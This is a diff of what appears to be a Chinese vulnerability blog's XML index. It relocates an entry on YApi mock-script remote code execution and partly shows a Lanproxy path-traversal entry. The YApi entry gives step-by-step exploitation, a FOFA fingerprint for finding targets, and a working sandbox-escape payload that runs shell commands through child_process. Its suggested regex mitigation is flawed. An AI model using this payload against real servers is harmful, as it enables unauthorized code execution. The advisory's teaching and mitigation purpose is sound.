@@ -1923,44 +1923,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Yapi Mock远程代码执行漏洞</title>
-    <url>//8cd1c56722a1.html</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://github.com/YMFE/yapi">Yapi</a> 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。</p>
-<p>YApi接口管理平台远程代码执行0day漏洞，攻击者可通过平台注册用户添加接口，设置mock脚本从而执行任意代码。鉴于该漏洞目前处于0day漏洞利用状态，强烈建议客户尽快采取缓解措施以避免受此漏洞影响</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Yapi &lt;= 1.9.2</p>
-<h2 id="FOFA搜索指纹"><a href="#FOFA搜索指纹" class="headerlink" title="FOFA搜索指纹"></a>FOFA搜索指纹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fofa:app&#x3D;&quot;YApi&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该平台默认开启注册功能，直接注册登录即可</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7rc5vdij60lp0lp41g02.jpg" alt="yapi远程代码执行漏洞1.png"></p>
-<p>注册之后新建项目</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7tbt2z8j60xb0fs0su02.jpg" alt="yapi远程代码执行漏洞2.png"></p>
-<p>添加接口</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7u3psyvj614u0cdmxo02.jpg" alt="yapi远程代码执行漏洞3.png"></p>
-<p>选择高级mock-脚本-开启脚本</p>
-<p>把以下代码粘贴到脚本中</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami &amp;&amp; ps -ef&quot;</span>).toString()</span><br></pre></td></tr></table></figure>
-
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7zvi0rdj613f0cggm202.jpg" alt="yapi远程代码执行漏洞4.png"></p>
-<p>保存代码并预览</p>
-<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg80lszuwj60my05njra02.jpg" alt="yapi远程代码执行漏洞5.png"></p>
-<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.Yapi作者已经停止更新，建议禁止用户注册。通过修改 Yapi 项目目录下的 config.json 文件，将 closeRegister 字段修改为 true 并重启服务即可。</p>
-<p>2.升级维护版本（非官方）</p>
-<p><a href="https://github.com/yapi-pro/yapi">https://github.com/yapi-pro/yapi</a></p>
-<p>3.如果没有 Mock 功能的需求，建议关闭 Yapi 的 Mock 功能</p>
-<p>4.在 Mock 功能中加入对恶意代码的过滤。找到文件 <code>api/common/postmanLib.js</code> 的第178行，在函数 <code>function sandboxByNode(sandbox = &#123;&#125;, script)</code> 的开始添加一段过滤： <code>const filter = &#39;process|exec|require&#39;; const reg = new RegExp(&quot;[&quot;+filter+&quot;]&quot;, &quot;g&quot;); if(reg.test(script)) &#123; return false; &#125;</code></p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-        <category>Web应用漏洞</category>
-      </categories>
-      <tags>
-        <tag>高危漏洞</tag>
-        <tag>代码执行漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Lanproxy任意文件读取-CVE-2021-3019</title>
     <url>//0e7fcf3b35d4.html</url>
     <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>​        Lanproxy是一个将局域网个人电脑、服务器代理到公网的内网穿透工具，支持tcp流量转发，可支持任何tcp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面等等）本次Lanproxy 路径遍历漏洞 (CVE-2021-3019)通过../绕过读取任意文件。该漏洞允许目录遍历读取/../conf/config.properties来获取到内部网连接的凭据</p>
@@ -1996,6 +1958,44 @@
       <tags>
         <tag>信息泄露</tag>
         <tag>目录遍历</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Yapi Mock远程代码执行漏洞</title>
+    <url>//8cd1c56722a1.html</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><a href="https://github.com/YMFE/yapi">Yapi</a> 是高效、易用、功能强大的 api 管理平台，旨在为开发、产品、测试人员提供更优雅的接口管理服务。可以帮助开发者轻松创建、发布、维护 API，YApi 还为用户提供了优秀的交互体验，开发人员只需利用平台提供的接口数据写入工具以及简单的点击操作就可以实现接口的管理。</p>
+<p>YApi接口管理平台远程代码执行0day漏洞，攻击者可通过平台注册用户添加接口，设置mock脚本从而执行任意代码。鉴于该漏洞目前处于0day漏洞利用状态，强烈建议客户尽快采取缓解措施以避免受此漏洞影响</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Yapi &lt;= 1.9.2</p>
+<h2 id="FOFA搜索指纹"><a href="#FOFA搜索指纹" class="headerlink" title="FOFA搜索指纹"></a>FOFA搜索指纹</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Fofa:app&#x3D;&quot;YApi&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>该平台默认开启注册功能，直接注册登录即可</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7rc5vdij60lp0lp41g02.jpg" alt="yapi远程代码执行漏洞1.png"></p>
+<p>注册之后新建项目</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7tbt2z8j60xb0fs0su02.jpg" alt="yapi远程代码执行漏洞2.png"></p>
+<p>添加接口</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7u3psyvj614u0cdmxo02.jpg" alt="yapi远程代码执行漏洞3.png"></p>
+<p>选择高级mock-脚本-开启脚本</p>
+<p>把以下代码粘贴到脚本中</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> sandbox = <span class="built_in">this</span></span><br><span class="line"><span class="keyword">const</span> ObjectConstructor = <span class="built_in">this</span>.constructor</span><br><span class="line"><span class="keyword">const</span> FunctionConstructor = ObjectConstructor.constructor</span><br><span class="line"><span class="keyword">const</span> myfun = FunctionConstructor(<span class="string">&#x27;return process&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> process = myfun()</span><br><span class="line">mockJson = process.mainModule.require(<span class="string">&quot;child_process&quot;</span>).execSync(<span class="string">&quot;whoami &amp;&amp; ps -ef&quot;</span>).toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg7zvi0rdj613f0cggm202.jpg" alt="yapi远程代码执行漏洞4.png"></p>
+<p>保存代码并预览</p>
+<p><img src="http://ww1.sinaimg.cn/large/005XcLBjgy1gsg80lszuwj60my05njra02.jpg" alt="yapi远程代码执行漏洞5.png"></p>
+<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>1.Yapi作者已经停止更新，建议禁止用户注册。通过修改 Yapi 项目目录下的 config.json 文件，将 closeRegister 字段修改为 true 并重启服务即可。</p>
+<p>2.升级维护版本（非官方）</p>
+<p><a href="https://github.com/yapi-pro/yapi">https://github.com/yapi-pro/yapi</a></p>
+<p>3.如果没有 Mock 功能的需求，建议关闭 Yapi 的 Mock 功能</p>
+<p>4.在 Mock 功能中加入对恶意代码的过滤。找到文件 <code>api/common/postmanLib.js</code> 的第178行，在函数 <code>function sandboxByNode(sandbox = &#123;&#125;, script)</code> 的开始添加一段过滤： <code>const filter = &#39;process|exec|require&#39;; const reg = new RegExp(&quot;[&quot;+filter+&quot;]&quot;, &quot;g&quot;); if(reg.test(script)) &#123; return false; &#125;</code></p>
+]]></content>
+      <categories>
+        <category>漏洞利用</category>
+        <category>Web应用漏洞</category>
+      </categories>
+      <tags>
+        <tag>高危漏洞</tag>
+        <tag>代码执行漏洞</tag>
       </tags>
   </entry>
   <entry>
